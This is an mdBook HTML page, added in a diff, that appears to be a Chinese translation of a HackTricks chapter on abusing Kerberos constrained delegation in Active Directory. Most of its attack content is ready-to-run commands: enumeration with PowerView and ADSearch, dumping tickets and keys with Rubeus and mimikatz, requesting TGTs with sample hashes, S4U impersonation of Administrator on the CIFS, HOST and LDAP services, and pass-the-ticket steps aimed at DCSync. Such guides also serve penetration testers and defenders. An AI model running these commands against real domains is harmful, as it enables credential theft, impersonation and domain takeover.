@@ -1,0 +1,302 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Constrained Delegation</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="受限委派"><a class="header" href="#受限委派">受限委派</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="受限委派-1"><a class="header" href="#受限委派-1">受限委派</a></h2>
+<p>使用此功能，域管理员可以<strong>允许</strong>计算机<strong>冒充</strong>用户或计算机<strong>对某台机器的服务</strong>。</p>
+<ul>
+<li><strong>用户自我服务（</strong><em><strong>S4U2self</strong></em><strong>）：</strong> 如果一个<strong>服务账户</strong>的 <em>userAccountControl</em> 值包含 <a href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx">TRUSTED_TO_AUTH_FOR_DELEGATION</a> (T2A4D)，那么它可以代表任何其他用户为自己（该服务）获取 TGS。</li>
+<li><strong>用户代理服务（</strong><em><strong>S4U2proxy</strong></em><strong>）：</strong> 一个<strong>服务账户</strong>可以代表任何用户为在 <strong>msDS-AllowedToDelegateTo</strong> 中设置的服务获取 TGS。为此，它首先需要从该用户获取 TGS，但可以使用 S4U2self 在请求另一个之前获取该 TGS。</li>
+</ul>
+<p><strong>注意</strong>：如果用户在 AD 中被标记为“<em>账户是敏感的，无法被委派</em>”，则您将<strong>无法冒充</strong>他们。</p>
+<p>这意味着如果您<strong>破解了服务的哈希</strong>，您可以<strong>冒充用户</strong>并代表他们获得对<strong>配置的服务</strong>的<strong>访问</strong>（可能的<strong>特权提升</strong>）。</p>
+<p>此外，您<strong>不仅可以访问用户能够冒充的服务，还可以访问任何服务</strong>，因为 SPN（请求的服务名称）没有被检查，只有权限。因此，如果您可以访问<strong>CIFS 服务</strong>，您也可以使用 Rubeus 中的 <code>/altservice</code> 标志访问<strong>HOST 服务</strong>。</p>
+<p>此外，<strong>DC 上的 LDAP 服务访问</strong>是利用 <strong>DCSync</strong> 所需的。</p>
+<p>{% code title="枚举" %}</p>
+<pre><code class="language-bash"># Powerview
+Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
+
+#ADSearch
+ADSearch.exe --search "(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+</code></pre>
+<p>{% endcode %}</p>
+<p>{% code title="获取 TGT" %}</p>
+<pre><code class="language-bash"># The first step is to get a TGT of the service that can impersonate others
+## If you are SYSTEM in the server, you might take it from memory
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+
+# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
+## Get AES/RC4 with mimikatz
+mimikatz sekurlsa::ekeys
+
+## Request with aes
+tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
+.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap
+
+# Request with RC4
+tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
+.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
+</code></pre>
+<p>{% endcode %}</p>
+<p>{% hint style="warning" %}
+还有<strong>其他方法可以获取TGT票证</strong>或<strong>RC4</strong>或<strong>AES256</strong>，而不需要在计算机上成为SYSTEM，例如打印机漏洞和不受限制的委派、NTLM中继和Active Directory证书服务滥用。</p>
+<p><strong>只要拥有该TGT票证（或哈希），您就可以在不危害整个计算机的情况下执行此攻击。</strong>
+{% endhint %}</p>
+<p>{% code title="使用Rubeus" %}</p>
+<pre><code class="language-bash">#Obtain a TGS of the Administrator user to self
+.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
+
+#Obtain service TGS impersonating Administrator (CIFS)
+.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS
+
+#Impersonate Administrator on different service (HOST)
+.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST
+
+# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap
+
+#Load ticket in memory
+.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
+</code></pre>
+<p>{% endcode %}</p>
+<p>{% code title="kekeo + Mimikatz" %}</p>
+<pre><code class="language-bash">#Obtain a TGT for the Constained allowed user
+tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
+
+#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
+tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL
+
+#Load the TGS in memory
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
+</code></pre>
+<p>{% endcode %}</p>
+<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation"><strong>更多信息请访问 ired.team。</strong></a></p>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/active-directory-methodology/bloodhound.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/custom-ssp.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/active-directory-methodology/bloodhound.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/active-directory-methodology/custom-ssp.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
